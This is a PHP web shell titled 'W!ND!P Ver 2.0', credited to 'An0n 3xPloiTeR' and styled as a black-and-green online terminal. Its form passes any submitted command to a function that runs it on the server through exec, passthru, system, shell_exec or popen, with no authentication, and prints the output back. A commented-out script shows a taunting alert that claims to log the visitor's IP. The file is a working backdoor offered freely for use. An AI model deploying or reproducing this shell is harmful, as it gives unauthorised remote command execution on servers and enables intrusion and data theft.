<!DOCTYPE html>
<html lang="en">
	<head>
		<title>W!ND!P Ver 2.0 ~ An0n 3xPloiTeR</title>
		<meta charset="UTF-8" />
		<meta name="content" content="W!ND!P Ver 2.0" />
		<meta name="author" content="An0n 3xPloiTeR, Umar Arfeen Shah" />
		<meta name="about" content="Made By An0n 3xPloiTeR" />
		<meta name="description" content="Itx a Online Look a Like Terminal :D" />
		<meta name="revised" content="W!ND!P Ver 2.0, 01/05/2017" />
		<meta content='width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1' name='viewport'/>
		<meta http-equiv="refresh" content="" /><!-- For refreshing page after ___ intervals of time -->
		<script language="Javascript1.2">
			// function njs_nodroit() {
			// 	alert ("W!ND!P Made By An0n 3xPloiTeR");
			// 	alert ("There are no copyrights. You Can Share iT Freely :D");
			// 	alert ("But Copying Someone\'s Work is a Bad Idea :\'(");
			// 	alert ("Got Your Ip: <?php $ip = $_SERVER['REMOTE_ADDR']; echo $ip; ?> And Reported To An0n 3xPloiTeR :-)");
			// 	return false;
			// } document.oncontextmenu = njs_nodroit;
		</script>
		<style>
			body {
				background-color: black;
			}
			textarea {
				color: lawngreen;
				background-color: black; 
				font-family: Comic Sans Ms; 
				font-size: 100%;
			}
			input {
				font-family: Comic Sans Ms; 
				font-size: 50%; 
				color: white; 
				background-color: black; 
				border-width: 1px;
				border-left: black; 
				border-right: black; 
				border-width: 3px;
				border-radius: 4px; 
				border-style: groove;
				text-align: center;
			}
			footer {
				position: fixed;
				bottom: 5px;
				left: 0px;
				right: 0px;
				color: white;
				font-family: Comic Sans Ms;
				text-align: center;
			}
			.heading {
				font-family: Comic Sans Ms;
				color: red;
				text-align: center;
				font-size: 250%;
			}
			.input {
				margin-top: 3vh; 
				font-family: Comic Sans Ms;
				color: white;
				text-align: center;
				font-size: 250%;
				left: 0px;
				right: 0px;
				bottom: 0px;
			}
			.results {
				margin-top: 3vh;
				font-family: Comic Sans Ms;
				color: white;
				text-align: center;
				top: 11vh;
			}
		</style>
	</head>
	<body>
		<div class="heading">
			<font>W!ND!P Ver 2.0</font>
		</div>
		<div class="results">
			<textarea placeholder="Results Will Appeare Here :)" type="text" name="results" rows="20" cols="130"><?php
				if (isset($_POST['input'])) {
				$input = htmlspecialchars($_POST['input']);
				$host = $_SERVER['HTTP_HOST'];
				$computername = gethostname();
				function execute($in) {
				    $out = '';
				    if(function_exists('exec')) {
				        @exec($in,$out);
				        $out = @join("\n",$out);
				    } elseif(function_exists('passthru')) {
				        ob_start();
				        @passthru($in);
				        $out = ob_get_clean();
				    } elseif(function_exists('system')) {
				        ob_start();
				        @system($in);
				        $out = ob_get_clean();
				    } elseif(function_exists('shell_exec')) {
				        $out = shell_exec($in);
				    } elseif(is_resource($f = @popen($in,"r"))) {
				        $out = "";
				        while(!@feof($f))
				            $out .= fread($f,1024);
				        pclose($f);
				    }
				    return $out;
				}
				$results = $computername." @ ".$host." ~ ".execute($input);
				echo $results;
				}
			?></textarea>
		</div>
		<div class="input">
			<form action="" method="POST">
				<input type="text" name="input" placeholder="Commands Here" size="100" />
			</form>
		</div>
	</body>
</html>
